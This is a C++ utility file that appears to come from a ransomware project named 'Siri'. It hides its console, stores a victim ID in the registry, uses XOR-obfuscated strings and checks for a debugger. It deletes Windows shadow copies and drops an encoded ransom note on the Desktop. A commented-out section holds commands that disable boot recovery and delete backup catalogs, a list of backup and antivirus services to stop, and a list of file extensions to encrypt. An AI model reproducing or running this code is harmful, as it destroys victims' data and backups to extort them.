#include "utils.hpp"

void hideWindow()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int onlyMe()
{
	// XOR: Siri1806
	HANDLE mutex = CreateMutex(NULL, TRUE, sXOR("Siri1806"));

	// Check if the mutex is already owned by another instance
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex); // Close the mutex handle
		return 0;
	}
	return 1;
}

char *generateUUID()
{
	static char uuid[UUID_LENGTH + 1];
	const char *chars = "0123456789abcdef";
	int i;

	srand((unsigned int)time(NULL));

	for (i = 0; i < UUID_LENGTH; i++)
	{
		if (i == 8 || i == 13 || i == 18 || i == 23)
		{
			uuid[i] = '-';
		}
		else
		{
			uuid[i] = chars[rand() % RANDOM_RANGE];
		}
	}

	uuid[UUID_LENGTH] = '\0';
	return uuid;
}

void saveUUID()
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\Application\\Siri"),
		sXOR("ClientID")};
	regkey.lpData = generateUUID();

	createRegKey(regkey);
}

char *getUUID()
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\Application\\Siri"),
		sXOR("ClientID")};

	char *data = readRegKey(regkey);

	if (data == NULL)
	{
		regkey.lpData = generateUUID();
		createRegKey(regkey);
		return (char *)regkey.lpData;
	}

	return data;
}

void DeleteRestorePoints()
{
	// XOR: vssadmin delete shadows /all /quiet
	system(sXOR("vssadmin delete shadows /all /quiet & wmic shadowcopy delete"));
}

bool isDebuggerPresent()
{
	PPEB PEB_Address = (PPEB)__readgsqword(0x60);
	return PEB_Address->BeingDebugged;
}

int isPrime(int num)
{
	if (num <= 1)
	{
		return 0; // Not a prime
	}
	for (int i = 2; i * i <= num; i++)
	{
		if (num % i == 0)
		{
			return 0; // Not a prime
		}
	}
	return 1; // Prime
}

int calculatePrimeNo(int n)
{
	int candidate = 2; // Starting candidate for prime number
	int numPrimes = 0; // Counter for prime numbers found

	while (numPrimes < n)
	{
		if (isPrime(candidate))
		{
			numPrimes++;
			if (numPrimes == n)
			{
				return candidate; // Found the nth prime
			}
		}
		candidate++;
	}
	return -1; // Should never reach here
}

void ransomNote()
{
	const char *note = deXOR("6b50500e4572362822397d2c2a2c323922673631372823397c2c2b2c333923673731362822397d2c2a2c323922673631372823397c2c2b2c333923673731362822397d2c2a2c323922673631372823397c36722c687979276c716c687979276c716c687979276c316f3350500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558376b39500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e455845287a230e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e45584541237a676c58454150500e5f425f5b4a4a145f58454150500e45425f5b4a4a145f425f5b4a500e45584541504a145f425f5b4a4a144558454150500e5f425f5b4a4a145f425f5b50500e455845287a2227455845414a5b14455845414a5b144558454150500e4558455b5b4a0e4558454150500e4558455b5b4a0e4558455b5b4a0e4558454150500e45585f4a4a500e4558454150500e4558376b39790e45584e5b5b500e4558454150500e4558454150500e45535f4a50500e4558454150500e45535f4a50500e45535f4a50500e4558454150500e4e424e4150500e4558454150500e45316f3279500e4e5b4e4a4a5b0546534e4150500e455845415050054653454150500e4558454150500546534e5b5b5b0d5f58454150500e45584541505b0d4e58454150500e4558454150500e36722c6850500e45584541505b0d4e58454150500e455845415b53054558454150500e455845415b5305455845415b53054558454150500e4558454a535b0e4558454150500e455845415050676f2a6c425b530e455845425b530e4558454150500e4558464a53500e4558454150500e4558464a53500e4558464a53500e4558454150500e455b4e4250500e4558454150500e455845415022242c71464253530d465b464150500e4558454253530d465b464253530d4558454150500e465b464150500e465b464150500e4558464253530d465b464253530e4558454150500e45584541397a7d6c716c687979276c716c6879790e4558454150500e4558454150500e4558454150500e4558366b39500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e455845287a220e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e45584541227a674558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e45584541503924365845687979770a0d1741361942000b450911064b451a00041e504b0b1b171800044b0158071850234717114b4150500e4558454150500e4558454150500e4558454150500e36722c687979276c716c687979274558454150500e4558454150500e4558454150500e4558454150500e45584541397a7c45716c361102400c16024050274f17160c0f17510e3219170f191e4944583200021e470b1f444127115c0b110b0651500e4558454150500e4558454150500e4558454150500e452a6f287979276c716c687979276c58454150500e4558454150500e4558454150500e4558454150500e455845415039243658456879791f4b58350d15115d0058010e1e575a450c10131e1f4803581c0e05020e0617081105044b1756454150500e4558454150500e4558454150500e4558454150500e36722c415079276c4a4b41331f400b1d0615500941100a45021f1d5e100c0013500441450c0d04501940111d170f15040e0c15080414194f111d09185e500e4558454150500e45582c6b2279276c716c6879790e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e452a6f287979274558454150500e4558454150500e45586c6879790e4558454150500e4558454150500e4558454150500e4558454150500e455845287a230e6c716c273f3c622a2f45283e237a372d2635393f6036582a335022673633452d3f23672b3f45383f257c453e2c2d35230f4558454150500e4558454150500e45584541237a676c716c687979276c716c6850500e4558454150500e4558454150500e4558454150500e4558454150500e45316f3350500e45716c68201157454a555350257d2158110e5004460c0b453423347a450f040d1c155a4519010502155d1658454150500e4558454150500e4558454150500e452a6f285079276c71551914114d544f035845484a571d005442434f574a55574240185c41515449474d544b015943414b4558454150500e4558454150500e455845415050676f2b45687979276c71454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e4558454150500e455845415023242c586c6879796f0b1c4500501647091d450515135c1c0811040250590c14094112150e161d0b1550044145010a145e500e4558454150500e4558454150500e455845287a22276c716c687979276c716c4150500e4558454150500e4558454150500e4558454150500e4558454150500e37722c415079276c28090411034b45160a15155c0e121d45001c03414510041715504f451b0a1109504103581c0e05020e0311090403500e4558454150500e4558454150500e45582c6b23500e6c71040f14505900581609111c42451400001b505a0d1d0841041f0e11170a4104184b450810031c194d45110b4143500e4558454150500e4558454150500e4558454150500e36722c4150792701191c12501948451c0a0f57040e1c171041131f4315141c4f7979276c71454150500e4558454150500e4558454150500e4558454150392437716c687979276c716c6879500e4558454150500e4558454150500e4558454150500e4558454150500e4558376b3923673731362822397d2c2a2c323922673631372823397c2c2b2c333923673731362822397d2c2a2c323922673631372823397c2c2b2c333923673731362822397d2c2a2c32392267363137287a7a0e455845", XOR("-<<b)4)", 'L'));
	char *temp_dir = getenv(sXOR("HOMEPATH"));
	char file_path[256];
	strcpy(file_path, temp_dir);
	strcat(file_path, sXOR("\\Desktop\\SIRI_READ_ME.txt"));
	if (isFileEmpty(file_path))
	{
		writePlainText(sXOR("SIRI_READ_ME.txt"), note);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////
//
//
//		Burial ground
//
//
//
///////////////////////////////////////////////////////////////////////////////////////////

/*
private static void deleteShadowCopies()
		{
			Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000030E8 File Offset: 0x000012E8
		private static void disableRecoveryMode()
		{
			Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000030F4 File Offset: 0x000012F4
		private static void deleteBackupCatalog()
		{
			Program.runCommand("wbadmin delete catalog -quiet");
		}

		private static void stopBackupServices()
		{
			string[] array = new string[]
			{
				"BackupExecAgentBrowser",
				"BackupExecDiveciMediaService",
				"BackupExecJobEngine",
				"BackupExecManagementService",
				"vss",
				"sql",
				"svc$",
				"memtas",
				"sophos",
				"veeam",
				"backup",
				"GxVss",
				"GxBlr",
				"GxFWD",
				"GxCVD",
				"GxCIMgr",
				"DefWatch",
				"ccEvtMgr",
				"SavRoam",
				"RTVscan",
				"QBFCService",
				"Intuit.QuickBooks.FCS",
				"YooBackup",
				"YooIT",
				"zhudongfangyu",
				"sophos",
				"stc_raw_agent",
				"VSNAPVSS",
				"QBCFMonitorService",
				"VeeamTransportSvc",
				"VeeamDeploymentService",
				"VeeamNFSSvc",
				"veeam",
				"PDVFSService",
				"BackupExecVSSProvider",
				"BackupExecAgentAccelerator",
				"BackupExecRPCService",
				"AcrSch2Svc",
				"AcronisAgent",
				"CASAD2DWebSvc",
				"CAARCUpdateSvc",
				"TeamViewer"
			};
			foreach (string name in array)
			{
				try
				{
					ServiceController serviceController = new ServiceController(name);
					serviceController.Stop();
				}
				catch
				{
				}
			}
		}

		private static string[] validExtensions = new string[]
		{
			".js",
			".sln",
			".suo",
			".cs",
			".c",
			".cpp",
			".pas",
			".h",
			".asm",
			".sqlite3",
			".sqlitedb",
			".sql",
			".accdb",
			".mdb",
			".db",
			".cmd",
			".bat",
			".lnk",
			".url",
			".mat",
			".kys",
			".pif",
			".scf",
			".shs",
			".shb",
			".xnx",
			".ps1",
			".vbs",
			".vb",
			".pl",
			".jsp",
			".php",
			".asp",
			".rb",
			".java",
			".jar",
			".class",
			".sh",
			".mp3",
			".wav",
			".swf",
			".fla",
			".wmv",
			".mpg",
			".vob",
			".mpeg",
			".asf",
			".avi",
			".mov",
			".mp4",
			".3gp",
			".mkv",
			".3g2",
			".flv",
			".raw",
			".gif",
			".png",
			".bmp",
			".jpg",
			".jpeg",
			".vcd",
			".iso",
			".backup",
			".zip",
			".rar",
			".7z",
			".gz",
			".tgz",
			".ta",
			".pdf",
			".pptx",
			".ppt",
			".xltm",
			".xltx",
			".xlc",
			".xlm",
			".xlt",
			".xlw",
			".xlsb",
			".xlsm",
			".xlsx",
			".xls",
			".docx",
			".doc",
			".htm,",
			".html",
			".php5",
			".php",
			".phtml",
			".fla",
			".cmd",
			".ink",
			".exe",
			". txt",
			".gif",
			".csv",
			".raw",
			".lua",
			".dat",
			".vbs",
			".vb6",
			".apk",
			".config",
			".c",
			".resx",
			".vbproj",
			".myapp",
			".cache",
			".pdb",
			".manifest",
			".png",
			".bmp",
			".eps",
			".hdr",
			".exr",
			".ico",
			".svg",
			".tga",
			".tiff",
			".wbmp",
			".webp"
		};

*/